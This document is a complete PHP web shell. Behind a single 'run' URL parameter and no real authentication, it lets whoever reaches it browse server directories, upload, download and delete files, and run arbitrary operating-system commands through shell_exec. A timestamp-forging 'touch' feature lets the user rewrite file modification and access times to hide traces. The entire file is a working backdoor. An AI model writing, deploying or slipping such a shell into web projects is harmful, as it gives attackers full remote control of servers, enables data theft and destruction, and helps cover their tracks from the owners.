<?php

if (!isset($_GET['run'])) exit;

$path = isset($_POST['path']) ? realpath($_POST['path']) : dirname(__FILE__);

if(isset( $_POST['down']) && $_POST['down'] !== '')
{
   // echo '' . $_POST['down'] . '<br />';
   down($path . DIRECTORY_SEPARATOR . $_POST['down']);
}


if(isset( $_POST['touchFile']) && $_POST['touchFile'] !== '')
{
   // echo '' . $_POST['down'] . '<br />';
   touchFile($path . DIRECTORY_SEPARATOR . $_POST['touchFile'], $_POST['touchDateMod'], $_POST['touchDateAccess']);
}

if(isset( $_POST['shell']) && $_POST['shell'] !== '')
{
   // echo '' . $_POST['down'] . '<br />';
   shell($_POST['shell'] );
}



?>
    <form action=""
          method="post"
          enctype="multipart/form-data"
    >

        <input type="text"
               value="<?= $path ?>"
               name="path"
               id="path"
               style="width:500px"/>
        <br/>
        <input type="hidden"
                    value=""
                    name="del"
                    id="del" />
             <br/>
        <input type="hidden"
                    value=""
                    name="down"
                    id="down" />
             <br/>
        <input type="hidden"
                    value=""
                    name="touchFile"
                    id="touchFile" />
             <br/>
        <input type="hidden"
                    value=""
                    name="touchDateMod"
                    id="touchDateMod" />
             <br/>
        <input type="hidden"
                    value=""
                    name="touchDateAccess"
                    id="touchDateAccess" />
             <br/>


        <input type="file" id="file" name="file" />

        Shell
        <input type="text"
                    value=""
                    name="shell"
                    id="shell"
                    style="width:500px"/>

        <br/>
        <input type="submit"
               id="submit"
               value="Run"
               name="Run"/>
    </form>

    <script>

        function goItem(name) {

            document.getElementById('path').value += "\<?=DIRECTORY_SEPARATOR ?>" + name;
            document.getElementById('submit').click();
        }

        function delItem(name) {
            if(!confirm('Do you really want to delete ' + name + ' ?')) return;
            document.getElementById('del').value = name;
            document.getElementById('submit').click();
        }

        function downItem(name) {
            //if(!confirm('Do you really want to get ' + name + ' ?')) return;
            document.getElementById('down').value = name;
            document.getElementById('submit').click();
        }

        function touchItem(name) {
            document.getElementById('touch_title').innerText = name;
            document.getElementById('touchFile').value = name;
            document.getElementById('touchPopup').style.visibility = 'visible';
        }

        function touch() {

                    document.getElementById('touchDateMod').value = document.getElementById('touch_date_mod').value;
                    document.getElementById('touchDateAccess').value = document.getElementById('touch_date_acc').value;
                    document.getElementById('submit').click();
                }


        function closeTouchPopup() {
            document.getElementById('touch_title').innerText = '';
            document.getElementById('touchPopup').style.visibility = 'hidden';
            }

    </script>

<div id="touchPopup" style="visibility:hidden;background:gray; border:2px solid #000;padding:1em; position:absolute; top:20px; left:30%">
    <h4 id="touch_title"></h4>
    Mod: <input type="text"
             value=""
             name="touch_date_mod"
             id="touch_date_mod"
             style="width:auto"/>
    <br />
    Access <input type="text"
             value=""
             name="touch_date_acc"
             id="touch_date_acc"
             style="width:auto"/>
    <br />

    <input type="button" onClick="closeTouchPopup();" value="Cancel"/>
    <input type="button" onClick="touch();"  value="OK"/>

</div>


<?php
if (!isset($_POST['Run'])) exit;

echo '' . $path . '<br />';

if(($_FILES['file']['name'] !== ''))
{
    move_uploaded_file($_FILES['file']['tmp_name'], $path . DIRECTORY_SEPARATOR . $_FILES['file']['name']);
}

if(($_POST['del'] !== ''))
{
    unlink($path . DIRECTORY_SEPARATOR . $_POST['del']);
}




if ($handle = opendir($path))
{

    while (false !== ($file = readdir($handle)))
    {
        $fileFullPath = $path . DIRECTORY_SEPARATOR . $file;

        $str_line = '';

        $stat = stat($fileFullPath);
        $strDateMod = date ("Y-m-d H:i", $stat['mtime']); // Modification time
        $strDateAccess = date ("Y-m-d H:i", $stat['atime']); //time of last access
       //$strDateAccess = $stat['uid']; //usrer id

        $strStats =' |' . $stat['uid'] . '|' . $stat['gid'] .'|' . $strDateMod . '|' . $strDateAccess . '| ';

        $strTouch = '<a href="javascript: touchItem(\'' . $file . '\');" >[touch]<a/>';


        if (filetype($fileFullPath) == 'dir')
            $str_line = '<a href="javascript: goItem(\'' . $file . '\');" ><b>' . $file . '</b><a/>' . $strStats . $strTouch ;
        else
            $str_line = '<b>' . $file . '</b>' . $strStats. ' &nbsp; &nbsp; <a href="javascript: downItem(\'' . $file . '\');" >[&darr;]<a/><a href="javascript: delItem(\'' . $file . '\');" >[x]<a/>' . $strTouch;

        echo '' . $str_line . '<br />';
    }

    closedir($handle);
}


function down($filename)
{
    //Check the file exists or not
    if (file_exists($filename))
    {

        //Define header information
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header("Cache-Control: no-cache, must-revalidate");
        header("Expires: 0");
        header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
        header('Content-Length: ' . filesize($filename));
        header('Pragma: public');

        //Clear system output buffer
        flush();

        //Read the size of the file
        readfile($filename);

        //Terminate from the script
        die();
    }
    else
    {
        echo "File does not exist.";
    }
}

function touchFile($filename, $dateMod, $dateAcc)
{
    echo 'touchFile: ' . $filename  . '<br />';
    echo '$dateMod: ' . $dateMod  . '<br />';
    echo '$dateAcc: ' . $dateAcc  . '<br />';

    if (!file_exists($filename))
    {
        echo "File does not exist."; return;
    }

    if($dateMod == '' && $dateAcc == ''){echo "Dates empty."; return;}

    $tsMod = ($dateMod != '')?strtotime($dateMod): null;
    $tsAcc = ($dateAcc != '')?strtotime($dateAcc): null;

    touch($filename, $tsMod, $tsAcc);

}

function shell($command)
{
    echo '$command: ' .$command . '<br />';

    $output = shell_exec($command . '  2>&1');

    echo "<pre>$output</pre>";
}



exit;
?>